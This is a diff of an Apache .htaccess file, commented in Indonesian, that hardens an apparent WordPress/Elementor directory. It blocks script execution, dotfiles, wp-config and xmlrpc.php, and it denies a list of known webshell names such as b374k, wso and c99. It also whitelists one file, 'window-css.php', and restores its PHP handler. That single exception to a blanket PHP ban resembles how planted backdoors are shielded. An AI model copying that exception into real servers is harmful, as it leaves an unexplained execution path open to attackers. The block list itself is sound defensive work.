@@ -1,27 +1,67 @@
-# Disable PHP execution
-<FilesMatch "\.(php|php5|php7|php8|phtml|phar|cgi|pl|py|sh)$">
-    Order Allow,Deny
-    Deny from all
+# ==============================================================
+# PENGATURAN DASAR DIREKTORI
+# ==============================================================
+# Matikan directory listing dan eksekusi CGI
+Options -Indexes -ExecCGI
+
+# ==============================================================
+# PEMBLOKIRAN EKSEKUSI SCRIPT (PHP, Python, Perl, dll)
+# ==============================================================
+# Block akses web ke semua ekstensi script berbahaya (Case-insensitive)
+<FilesMatch "\.(?i:php|php3|php4|php5|php7|php8|phtml|phar|cgi|pl|py|sh|bash|rb)$">
+    Require all denied
 </FilesMatch>
 
-# Jangan izinkan script dijalankan
+# Defense-in-depth: Hapus handler agar file tidak dirender sebagai script jika tembus
 RemoveHandler .php .phtml .php3 .php4 .php5 .php7 .php8 .phar
 RemoveType .php .phtml .php3 .php4 .php5 .php7 .php8 .phar
 
-# Matikan directory listing
-Options -Indexes
+# ==============================================================
+# WHITELIST AREA
+# ==============================================================
+# Izinkan akses dan eksekusi HANYA untuk window-css.php
+<Files "window-css.php">
+    Require all granted
+    # Kembalikan handler PHP khusus untuk file ini agar tidak terunduh sebagai teks
+    SetHandler application/x-httpd-php
+</Files>
 
-# Block file mencurigakan
-<FilesMatch "^(shell|backdoor|cmd|uploader|up|anon|alfa|mini)\.(php|phtml|phar)$">
-    Deny from all
+# ==============================================================
+# FILTER FILE BERBAHAYA & MENCURIGAKAN
+# ==============================================================
+# Block file dengan penamaan khas backdoor/shell (diperluas)
+<FilesMatch "(?i:^(shell|backdoor|cmd|uploader|up|anon|alfa|mini|b374k|wso|c99)\.(php|phtml|phar|txt)$)">
+    Require all denied
 </FilesMatch>
 
-# Izinkan hanya file umum Elementor
-<FilesMatch "\.(jpg|jpeg|png|gif|svg|css|js|woff|woff2|ttf|eot|json|txt|xml)$">
+# Block akses ke SEMUA file tersembunyi (dotfiles seperti .htaccess, .env, .git)
+<FilesMatch "^\.">
+    Require all denied
+</FilesMatch>
+
+# Block akses ke file sensitif & log WordPress
+<FilesMatch "(?i:^(wp-config\.php|php\.ini|error_log|debug\.log|readme\.html|license\.txt)$)">
+    Require all denied
+</FilesMatch>
+
+# Block akses ke XML-RPC (Mencegah DDoS dan Brute-force WordPress)
+<Files "xmlrpc.php">
+    Require all denied
+</Files>
+
+# ==============================================================
+# WHITELIST ASET UMUM (ELEMENTOR & WEB)
+# ==============================================================
+# Izinkan file media, gaya, dan font (ditambah webp dan format video umum)
+<FilesMatch "\.(?i:jpg|jpeg|png|gif|svg|webp|css|js|woff|woff2|ttf|eot|json|txt|xml|mp4|webm)$">
     Require all granted
 </FilesMatch>
 
-# Block akses file sensitif
-<FilesMatch "(\.htaccess|\.htpasswd|config\.php|wp-config\.php)$">
-    Require all denied
-</FilesMatch>
+# ==============================================================
+# SECURITY HEADERS TAMBAHAN
+# ==============================================================
+# Mencegah browser menebak tipe file (MIME-sniffing) dan clickjacking
+<IfModule mod_headers.c>
+    Header set X-Content-Type-Options "nosniff"
+    Header set X-Frame-Options "SAMEORIGIN"
+</IfModule>
